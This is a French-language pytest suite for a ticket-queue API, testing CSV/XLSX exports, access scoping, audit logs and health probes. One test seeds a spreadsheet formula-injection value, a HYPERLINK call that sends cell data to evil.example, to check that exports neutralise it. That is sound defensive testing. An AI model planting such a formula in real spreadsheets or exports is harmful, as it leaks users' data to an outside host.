"""
Tests HTTP de bout en bout — exports CSV/XLSX et sondes de santé.

Pile complète, base de test, vrai Redis. Les fichiers exportés sont relus et vérifiés
(CSV analysé, XLSX ouvert avec openpyxl).
"""
import csv
import io
from datetime import datetime, timedelta, timezone

import pytest
from openpyxl import load_workbook
from sqlalchemy import select

from app.models.audit_log import AuditAction, AuditLog
from app.models.ticket import Ticket, TicketStatus
from app.models.user import UserRole
from tests.http_helpers import (  # noqa: F401  (fixtures importées par nom)
    api, auth, make_branch, make_counter, make_org, make_service, make_staff, make_user, make_world,
    real_redis,
)


def parse_csv(response) -> list[dict]:
    text = response.content.decode("utf-8-sig")        # BOM UTF-8 pour Excel
    return list(csv.DictReader(io.StringIO(text)))


async def seed_tickets(db, org, branch, service, count: int, *, status=TicketStatus.DONE, base_hour: int = 8,
                       counter_name: str | None = "Guichet 1"):
    """Insère `count` tickets avec des dates croissantes."""
    start = datetime.now(timezone.utc) - timedelta(days=1)
    rows = []
    for i in range(count):
        created = start.replace(hour=base_hour, minute=i % 60, second=0, microsecond=0)
        ticket = Ticket(
            number=f"{service.ticket_prefix}-{i + 1:03d}", prefix=service.ticket_prefix, sequence=i + 1,
            user_id=f"seed-{branch.id[:6]}-{service.ticket_prefix}-{i}", org_id=org.id, agency_id=branch.id,
            service_id=service.id, status=status, counter_name=counter_name,
            created_at=created, called_at=created + timedelta(minutes=3), service_seconds=120,
        )
        db.add(ticket)
        rows.append(ticket)
    await db.commit()
    return rows


# ══ Export des tickets : contenu ══════════════════════════════════════════════

@pytest.mark.asyncio
async def test_csv_export_content_headers_and_filename(api, db_session):
    org, branch, service, counter, agent, client = await make_world(db_session)
    supervisor = await make_staff(db_session, org.id, UserRole.SUPERVISOR, branch.id)
    await seed_tickets(db_session, org, branch, service, 3)

    response = await api.get(f"/api/v1/organizations/{org.id}/branches/{branch.id}/tickets/export",
                             headers=auth(supervisor))

    assert response.status_code == 200
    assert response.headers["content-type"].startswith("text/csv")
    assert f'filename="tickets_{org.id}_' in response.headers["content-disposition"]
    assert response.headers["content-disposition"].endswith('.csv"')
    rows = parse_csv(response)
    assert [r["number"] for r in rows] == ["A-001", "A-002", "A-003"]
    assert rows[0]["status"] == "done" and rows[0]["branch"] == "Agence Centre" and rows[0]["service"] == "Dépôt"
    assert rows[0]["wait_seconds"] == "180" and rows[0]["service_seconds"] == "120"
    assert response.content.startswith(b"\xef\xbb\xbf"), "BOM UTF-8 : Excel affiche correctement les accents"


@pytest.mark.asyncio
async def test_csv_export_neutralizes_formula_injection(api, db_session):
    """Une cellule « =HYPERLINK(...) » exfiltrerait des données dans Excel : elle est préfixée d'une apostrophe."""
    org, branch, service, counter, agent, client = await make_world(db_session)
    supervisor = await make_staff(db_session, org.id, UserRole.SUPERVISOR, branch.id)
    await seed_tickets(db_session, org, branch, service, 1,
                       counter_name='=HYPERLINK("http://evil.example/?x="&A1,"clic")')

    response = await api.get(f"/api/v1/organizations/{org.id}/branches/{branch.id}/tickets/export",
                             headers=auth(supervisor))

    cell = parse_csv(response)[0]["counter"]
    assert cell.startswith("'="), cell
    assert not cell.startswith("="), "jamais interprétée comme formule"


@pytest.mark.asyncio
async def test_xlsx_export_has_named_sheet_bold_header_and_data(api, db_session):
    org, branch, service, counter, agent, client = await make_world(db_session)
    supervisor = await make_staff(db_session, org.id, UserRole.SUPERVISOR, branch.id)
    await seed_tickets(db_session, org, branch, service, 2)

    response = await api.get(f"/api/v1/organizations/{org.id}/branches/{branch.id}/tickets/export",
                             params={"format": "xlsx"}, headers=auth(supervisor))

    assert response.status_code == 200
    assert "spreadsheetml" in response.headers["content-type"]
    assert response.headers["content-disposition"].endswith('.xlsx"')
    sheet = load_workbook(io.BytesIO(response.content))["Tickets"]
    assert sheet["A1"].value == "ticket_id" and sheet["A1"].font.bold is True
    assert sheet.max_row == 3, "en-tête + 2 tickets (données à partir de la ligne 2)"
    assert sheet["B2"].value == "A-001"


@pytest.mark.asyncio
async def test_export_filters_by_status_service_and_period(api, db_session):
    org, branch, service, counter, agent, client = await make_world(db_session)
    credit = await make_service(db_session, org.id, branch.id, "B", "Crédit")
    admin = await make_staff(db_session, org.id, UserRole.ADMIN_ORG)
    await seed_tickets(db_session, org, branch, service, 2, status=TicketStatus.DONE)
    await seed_tickets(db_session, org, branch, credit, 2, status=TicketStatus.CANCELLED)
    url = f"/api/v1/organizations/{org.id}/tickets/export"

    done = parse_csv(await api.get(url, params={"status": "done"}, headers=auth(admin)))
    two_statuses = parse_csv(await api.get(url, params={"status": "done,cancelled"}, headers=auth(admin)))
    by_service = parse_csv(await api.get(url, params={"service_id": credit.id}, headers=auth(admin)))
    future = (datetime.now(timezone.utc) + timedelta(days=1)).isoformat()
    after = parse_csv(await api.get(url, params={"from_date": future}, headers=auth(admin)))

    assert len(done) == 2 and {r["status"] for r in done} == {"done"}
    assert len(two_statuses) == 4
    assert {r["service"] for r in by_service} == {"Crédit"} and len(by_service) == 2
    assert after == [], "aucun ticket après demain : seul l'en-tête est exporté"


@pytest.mark.asyncio
async def test_export_limit_is_applied_and_capped(api, db_session):
    org, branch, service, counter, agent, client = await make_world(db_session)
    admin = await make_staff(db_session, org.id, UserRole.ADMIN_ORG)
    await seed_tickets(db_session, org, branch, service, 5)
    url = f"/api/v1/organizations/{org.id}/tickets/export"

    assert len(parse_csv(await api.get(url, params={"limit": 2}, headers=auth(admin)))) == 2
    assert len(parse_csv(await api.get(url, params={"limit": 10_000_000}, headers=auth(admin)))) == 5


@pytest.mark.asyncio
async def test_export_streams_large_volumes_in_batches(api, db_session, monkeypatch):
    """Plusieurs lots (pagination par clé) : aucun ticket perdu ni dupliqué, ordre stable."""
    from app.core.config import settings
    monkeypatch.setattr(settings, "EXPORT_BATCH_SIZE", 7)
    org, branch, service, counter, agent, client = await make_world(db_session)
    admin = await make_staff(db_session, org.id, UserRole.ADMIN_ORG)
    await seed_tickets(db_session, org, branch, service, 40)

    rows = parse_csv(await api.get(f"/api/v1/organizations/{org.id}/tickets/export", headers=auth(admin)))

    assert len(rows) == 40
    assert [r["number"] for r in rows] == [f"A-{i:03d}" for i in range(1, 41)]
    assert len({r["ticket_id"] for r in rows}) == 40


@pytest.mark.asyncio
async def test_export_validation_errors(api, db_session):
    org, branch, service, counter, agent, client = await make_world(db_session)
    admin = await make_staff(db_session, org.id, UserRole.ADMIN_ORG)
    url = f"/api/v1/organizations/{org.id}/tickets/export"

    bad_format = await api.get(url, params={"format": "pdf"}, headers=auth(admin))
    bad_status = await api.get(url, params={"status": "waiting,inconnu"}, headers=auth(admin))
    bad_period = await api.get(url, params={"from_date": "2026-02-01T00:00:00Z", "to_date": "2026-01-01T00:00:00Z"},
                               headers=auth(admin))

    assert bad_format.status_code == 422 and bad_format.json()["detail"]["code"] == "INVALID_FORMAT"
    assert bad_status.status_code == 422 and bad_status.json()["detail"]["code"] == "INVALID_STATUS"
    assert bad_period.status_code == 422 and bad_period.json()["detail"]["code"] == "INVALID_PERIOD"


# ══ Export : droits et périmètre ══════════════════════════════════════════════

@pytest.mark.asyncio
async def test_export_roles_and_branch_scope(api, db_session):
    org, branch_a, service_a, counter, agent, client = await make_world(db_session)
    branch_b = await make_branch(db_session, org.id, "Annexe")
    service_b = await make_service(db_session, org.id, branch_b.id, "B", "Annexe-dépôt")
    await seed_tickets(db_session, org, branch_a, service_a, 2)
    await seed_tickets(db_session, org, branch_b, service_b, 3)
    supervisor_a = await make_staff(db_session, org.id, UserRole.SUPERVISOR, branch_a.id)
    admin_org = await make_staff(db_session, org.id, UserRole.ADMIN_ORG)
    org_url = f"/api/v1/organizations/{org.id}/tickets/export"

    assert (await api.get(org_url, headers=auth(client))).status_code == 403
    assert (await api.get(org_url, headers=auth(agent))).status_code == 403, "les agents n'exportent pas"

    scoped = parse_csv(await api.get(org_url, headers=auth(supervisor_a)))
    assert {r["branch"] for r in scoped} == {"Agence Centre"} and len(scoped) == 2, "limité à SA branch"
    everything = parse_csv(await api.get(org_url, headers=auth(admin_org)))
    assert len(everything) == 5

    foreign_branch = await api.get(f"/api/v1/organizations/{org.id}/branches/{branch_b.id}/tickets/export",
                                   headers=auth(supervisor_a))
    assert foreign_branch.status_code == 403 and foreign_branch.json()["detail"]["code"] == "BRANCH_FORBIDDEN"
    via_query = await api.get(org_url, params={"branch_id": branch_b.id}, headers=auth(supervisor_a))
    assert via_query.status_code == 403, "le filtre branch_id ne contourne pas le périmètre"

    other_org = await make_org(db_session)
    outsider = await make_staff(db_session, other_org.id, UserRole.ADMIN_ORG)
    assert (await api.get(org_url, headers=auth(outsider))).status_code == 403, "autre organisation"


@pytest.mark.asyncio
async def test_export_never_leaks_other_organizations_tickets(api, db_session):
    org, branch, service, counter, agent, client = await make_world(db_session)
    other_org = await make_org(db_session)
    other_branch = await make_branch(db_session, other_org.id)
    other_service = await make_service(db_session, other_org.id, other_branch.id, "Z", "Secret")
    await seed_tickets(db_session, other_org, other_branch, other_service, 3)
    await seed_tickets(db_session, org, branch, service, 1)
    admin = await make_staff(db_session, org.id, UserRole.ADMIN_ORG)

    response = await api.get(f"/api/v1/organizations/{org.id}/tickets/export", headers=auth(admin))

    assert [r["service"] for r in parse_csv(response)] == ["Dépôt"]
    assert "Secret" not in response.text

    # L'ID d'une branch d'une autre organisation est inconnu (404, pas d'indice d'existence)
    probe = await api.get(f"/api/v1/organizations/{org.id}/tickets/export",
                          params={"branch_id": other_branch.id}, headers=auth(admin))
    assert probe.status_code == 404


@pytest.mark.asyncio
async def test_successful_export_is_audited_with_filters(api, db_session):
    org, branch, service, counter, agent, client = await make_world(db_session)
    supervisor = await make_staff(db_session, org.id, UserRole.SUPERVISOR, branch.id)
    await seed_tickets(db_session, org, branch, service, 4)

    await api.get(f"/api/v1/organizations/{org.id}/branches/{branch.id}/tickets/export",
                  params={"status": "done", "limit": 3}, headers=auth(supervisor))
    await api.get(f"/api/v1/organizations/{org.id}/branches/{branch.id}/tickets/export",
                  params={"format": "xlsx"}, headers=auth(supervisor))
    await api.get(f"/api/v1/organizations/{org.id}/branches/{branch.id}/tickets/export",
                  params={"format": "pdf"}, headers=auth(supervisor))   # refusé : pas d'audit

    entries = (await db_session.execute(
        select(AuditLog).where(AuditLog.action == AuditAction.TICKET_EXPORTED).order_by(AuditLog.created_at)
    )).scalars().all()
    assert len(entries) == 2, "un export refusé n'est pas tracé comme réussi"
    csv_entry, xlsx_entry = entries
    assert csv_entry.actor_id == supervisor.id and csv_entry.actor_role == "supervisor"
    assert csv_entry.extra_data["format"] == "csv" and csv_entry.extra_data["rows"] == 3
    assert csv_entry.extra_data["statuses"] == ["done"] and csv_entry.extra_data["limit"] == 3
    assert csv_entry.extra_data["branch_ids"] == [branch.id]
    assert xlsx_entry.extra_data["format"] == "xlsx" and xlsx_entry.extra_data["rows"] == 4


# ══ Export des statistiques ═══════════════════════════════════════════════════

async def seed_stats(db, org, branch, service, waits_seconds: list[int], absent: int):
    """Journal d'audit minimal pour les statistiques : créations, appels (attente), absences."""
    from app.models.queue_log import QueueLog, QueueLogAction
    ticket = (await seed_tickets(db, org, branch, service, 1))[0]
    for wait in waits_seconds:
        db.add(QueueLog(org_id=org.id, ticket_id=ticket.id, agency_id=branch.id, service_id=service.id,
                        action=QueueLogAction.TICKET_CREATED, to_status="waiting"))
        db.add(QueueLog(org_id=org.id, ticket_id=ticket.id, agency_id=branch.id, service_id=service.id,
                        action=QueueLogAction.TICKET_CALLED, from_status="waiting", to_status="called",
                        elapsed_seconds=wait))
    for _ in range(absent):
        db.add(QueueLog(org_id=org.id, ticket_id=ticket.id, agency_id=branch.id, service_id=service.id,
                        action=QueueLogAction.TICKET_ABSENT, from_status="called", to_status="absent"))
    await db.commit()


@pytest.mark.asyncio
async def test_stats_export_csv_one_row_per_service(api, db_session):
    org, branch, service, counter, agent, client = await make_world(db_session)
    supervisor = await make_staff(db_session, org.id, UserRole.SUPERVISOR, branch.id)
    await seed_stats(db_session, org, branch, service, waits_seconds=[60, 180], absent=1)

    response = await api.get(f"/api/v1/organizations/{org.id}/branches/{branch.id}/stats/export", headers=auth(supervisor))

    assert response.status_code == 200 and f"stats_{branch.id}_" in response.headers["content-disposition"]
    rows = parse_csv(response)
    assert list(rows[0].keys()) == ["service_id", "service_name", "total_tickets", "avg_wait_seconds", "absence_rate_pct"]
    assert rows[0]["service_name"] == "Dépôt" and rows[0]["total_tickets"] == "2"
    assert rows[0]["avg_wait_seconds"] == "120"
    assert rows[0]["absence_rate_pct"] == "50.0", "1 absent pour 2 appels"


@pytest.mark.asyncio
async def test_stats_export_xlsx_has_summary_and_service_sheets(api, db_session):
    org, branch, service, counter, agent, client = await make_world(db_session)
    supervisor = await make_staff(db_session, org.id, UserRole.SUPERVISOR, branch.id)
    await seed_stats(db_session, org, branch, service, waits_seconds=[120], absent=0)

    response = await api.get(f"/api/v1/organizations/{org.id}/branches/{branch.id}/stats/export",
                             params={"format": "xlsx"}, headers=auth(supervisor))

    workbook = load_workbook(io.BytesIO(response.content))
    assert workbook.sheetnames == ["Résumé", "Par service"]
    summary = {row[0].value: row[1].value for row in workbook["Résumé"].iter_rows(min_row=2)}
    assert summary["total_tickets"] == 1 and summary["avg_wait_minutes"] == 2.0
    assert workbook["Par service"]["B2"].value == "Dépôt"


@pytest.mark.asyncio
async def test_stats_export_empty_branch_returns_header_only_and_is_scoped(api, db_session):
    org, branch, service, counter, agent, client = await make_world(db_session)
    other = await make_branch(db_session, org.id, "Annexe")
    supervisor = await make_staff(db_session, org.id, UserRole.SUPERVISOR, branch.id)

    empty = await api.get(f"/api/v1/organizations/{org.id}/branches/{branch.id}/stats/export", headers=auth(supervisor))
    foreign = await api.get(f"/api/v1/organizations/{org.id}/branches/{other.id}/stats/export", headers=auth(supervisor))
    agent_denied = await api.get(f"/api/v1/organizations/{org.id}/branches/{branch.id}/stats/export", headers=auth(agent))

    assert empty.status_code == 200 and parse_csv(empty) == []
    assert empty.content.decode("utf-8-sig").strip() == "service_id,service_name,total_tickets,avg_wait_seconds,absence_rate_pct"
    assert foreign.status_code == 403 and agent_denied.status_code == 403
    audit = (await db_session.execute(select(AuditLog).where(AuditLog.action == AuditAction.STATS_EXPORTED))).scalars().all()
    assert len(audit) == 1 and audit[0].target_id == branch.id


# ══ Santé ═════════════════════════════════════════════════════════════════════

@pytest.mark.asyncio
async def test_basic_live_and_ready_probes_are_public(api, db_session):
    health = await api.get("/health")
    live = await api.get("/health/live")
    ready = await api.get("/health/ready")
    status = await api.get("/health/status")

    assert health.status_code == 200
    assert health.json() == {"status": "awake", "service": "tonde-api"}
    assert live.status_code == 200 and live.json() == {"status": "alive"}
    assert ready.status_code == 200 and ready.json()["status"] == "ready"
    assert ready.json()["checks"]["redis"]["latency_ms"] is not None
    assert status.status_code == 200 and status.json()["status"] == "ok"
    assert status.json()["services"] == {"api": "ok", "redis": "ok", "database": "ok"}


@pytest.mark.asyncio
async def test_wake_health_never_touches_database_or_redis(api, db_session, monkeypatch):
    from app.services import health_service

    async def must_not_be_called():
        raise AssertionError("/health ne doit interroger ni PostgreSQL ni Redis")

    monkeypatch.setattr(health_service, "readiness", must_not_be_called)

    response = await api.get("/health")
    assert response.status_code == 200
    assert response.json() == {"status": "awake", "service": "tonde-api"}


@pytest.mark.asyncio
async def test_readiness_returns_503_when_redis_is_down_but_wake_and_liveness_stay_up(api, db_session, monkeypatch):
    from app.services import health_service

    async def redis_down():
        return {"status": "unhealthy", "latency_ms": None, "error": "ConnectionError"}

    monkeypatch.setattr(health_service, "check_redis", redis_down)

    ready = await api.get("/health/ready")
    status = await api.get("/health/status")
    health = await api.get("/health")
    live = await api.get("/health/live")

    assert ready.status_code == 503 and ready.json()["status"] == "not_ready"
    assert status.status_code == 503 and status.json()["status"] == "degraded"
    assert status.json()["services"]["redis"] == "error"
    assert health.status_code == 200 and health.json()["status"] == "awake"
    assert live.status_code == 200, "le processus vit : Kubernetes ne doit pas le redémarrer pour une panne Redis"


@pytest.mark.asyncio
async def test_detailed_health_is_admin_only_and_complete(api, db_session):
    org, branch, service, counter, agent, client = await make_world(db_session)
    admin_org = await make_staff(db_session, org.id, UserRole.ADMIN_ORG)
    await api.post("/api/v1/tickets", json={"agency_id": branch.id, "service_id": service.id}, headers=auth(client))

    assert (await api.get("/health/detailed")).status_code in (401, 403)
    assert (await api.get("/health/detailed", headers=auth(client))).status_code == 403
    assert (await api.get("/health/detailed", headers=auth(agent))).status_code == 403

    response = await api.get("/health/detailed", headers=auth(admin_org))
    data = response.json()

    assert response.status_code == 200 and data["status"] == "healthy"
    assert data["checks"]["database"]["status"] == "healthy" and data["checks"]["redis"]["status"] == "healthy"
    assert data["checks"]["sms_gateway"]["status"] == "simulated"
    assert data["version"] and data["uptime_seconds"] >= 0 and data["timestamp"]
    metrics = data["metrics"]
    assert metrics["queue_size"] >= 1, "le ticket créé est compté dans les files"
    assert metrics["requests_per_minute"] >= 1 and metrics["requests_total"] >= 1
    assert set(metrics["active_connections"]) >= {"clients_by_ticket", "counter_connections", "total_clients"}
    assert "2xx" in metrics["responses_by_class"]


def test_request_metrics_window_and_counters():
    import time
    from app.core.metrics import RequestMetrics

    metrics = RequestMetrics()
    for code in (200, 201, 404, 500):
        metrics.record(code)
    assert metrics.requests_last_minute() == 4 and metrics.total_requests == 4
    assert dict(metrics.by_status_class) == {"2xx": 2, "4xx": 1, "5xx": 1}

    # Requêtes plus anciennes que la fenêtre : la file est chronologique, elles sont donc à gauche
    metrics._timestamps.extendleft([time.time() - 90, time.time() - 120])
    assert metrics.requests_last_minute() == 4, "les requêtes de plus d'une minute sont oubliées"
    assert metrics.uptime_seconds() >= 0
